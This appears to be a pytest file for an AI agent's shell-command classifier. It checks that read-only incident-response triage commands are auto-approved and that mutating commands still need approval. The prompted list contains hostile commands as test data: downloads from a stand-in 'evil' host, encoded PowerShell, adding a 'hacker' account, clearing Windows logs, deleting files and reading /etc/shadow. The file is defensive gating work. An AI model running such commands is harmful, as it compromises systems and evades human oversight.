"""Incident-response triage commands in the auto_review allow table.

These tests pin the two halves of the IR triage expansion in
``vulnclaw.agent.command_classifier``:

- the read-only investigation commands an operator types on a compromised
  host must NOT prompt (otherwise every ``ps``/``ls -al``/``grep`` costs an
  approval click during an incident);
- the state-mutating shape of the very same tools MUST still prompt
  (``systemctl stop``, ``crontab -e``, ``rpm -i``, ``net user ... /add``,
  ``wmic process call create``, ``wevtutil cl``, …).

The second half is the important one: a permissive entry that also lets the
mutating form through would be a real safety regression, not just friction.
"""

from __future__ import annotations

import pytest

from vulnclaw.agent.command_classifier import classify_shell_command

# ── read-only triage: must be auto-approved ──────────────────────────────

ALLOWED = [
    # Linux
    "ps aux --sort=-%cpu",
    "ps -ef",
    "ss -antp",
    "netstat -anpt",
    "ls -al /tmp",
    "ls -alt /bin",
    "lsof -p 1021",
    "lsof -i:8080",
    "last",
    "lastb",
    "lastlog",
    "who -a",
    "w",
    "systemctl status nginx",
    "systemctl list-units --type=service",
    "systemctl cat sshd.service",
    "journalctl -u sshd --since 2hours",
    "crontab -l",
    "lsmod",
    "modinfo nf_tables",
    "lsattr /tmp/evil.php",
    "stat /etc/passwd",
    "find / -ctime 0 -name *.sh",
    "find /var/www -name *.php -mtime -30",
    "grep -rn eval /var/www/",
    "rpm -Va",
    "rpm -qf /bin/ls",
    "rpm -q openssh-server",
    "strings /tmp/MLEFDb",
    "xxd -l 64 /tmp/x",
    "md5sum /bin/ls",
    "unhide proc",
    "chkrootkit -q",
    "service nginx status",
    "getcap -r /",
    "cat /etc/ld.so.preload",
    "ls -al /proc/1021",
    "head -50 /var/log/secure",
    "tail -100 /var/log/messages",
    "wc -l /var/log/secure",
    "file /tmp/x",
    "id",
    "uname -a",
    "df -h",
    "du -sh /var/www",
    # Windows
    "tasklist /v",
    "tasklist /svc",
    "netstat -ano",
    "sc query type= service state= all",
    "sc qc dBFh",
    "schtasks /query /fo LIST /v",
    "reg query HKLM",
    "wevtutil qe Security /f:text /c:50",
    "net user",
    "net localgroup administrators",
    "systeminfo",
    "driverquery",
    "whoami /all",
    "wmic useraccount get name,sid",
    "wmic process get name,processid,executablepath",
    "wmic service list brief",
    "ipconfig /all",
    "getmac",
    "arp -a",
    "route print",
    "quser",
]

# ── mutating shape: must still prompt ────────────────────────────────────

PROMPTED = [
    "rm -rf /var/www/html/uploads",
    "systemctl stop nginx",
    "systemctl disable sshd",
    "systemctl daemon-reload",
    "systemctl restart sshd",
    "systemctl enable evil",
    "crontab -r",
    "crontab -e",
    "rpm -e openssh-server",
    "rpm -i evil.rpm",
    "rpm -U evil.rpm",
    "mount /dev/sdb1 /mnt",
    "dmesg -C",
    "schtasks /create /tn evil /tr calc.exe",
    "schtasks /delete /tn evil",
    "schtasks /run /tn evil",
    "reg add HKLM",
    "reg delete HKLM",
    "reg import evil.reg",
    "wevtutil cl Security",
    "wevtutil clear-log System",
    "sc create evil binpath=c:/evil.exe",
    "sc stop nginx",
    "sc config nginx start= auto",
    "net user hacker Passw0rd /add",
    "net start evil",
    "net stop nginx",
    "net share evil=c:/",
    "wmic process call create calc.exe",
    "wmic process delete",
    "service nginx restart",
    "service nginx stop",
    "fsutil deletejournal C:",
    "find / -exec rm {} ;",
    "find /tmp -delete",
    "find / -fprint /tmp/x",
    "bash -c id",
    "python -c import_os",
    "curl http://evil/x.sh",
    "powershell -enc AAAA",
    "certutil -urlcache -f http://evil/x.exe x.exe",
    "sudo cat /etc/shadow",
    "awk {print} /etc/passwd",
    "xargs rm",
    # metacharacters / redirection stay gated
    "ps aux > /tmp/out.txt",
    "cat /etc/passwd < /tmp/x",
    "echo test > /tmp/x",
]


@pytest.mark.parametrize("command", ALLOWED)
def test_ir_triage_command_is_auto_approved(command: str) -> None:
    verdict = classify_shell_command(command)
    assert verdict.decision == "allow", (
        f"{command!r} should be auto-approved in auto_review, "
        f"got prompt: {verdict.reason}"
    )


@pytest.mark.parametrize("command", PROMPTED)
def test_mutating_shape_still_prompts(command: str) -> None:
    verdict = classify_shell_command(command)
    assert verdict.decision == "prompt", (
        f"{command!r} mutates state and must require approval, "
        "but was auto-approved"
    )
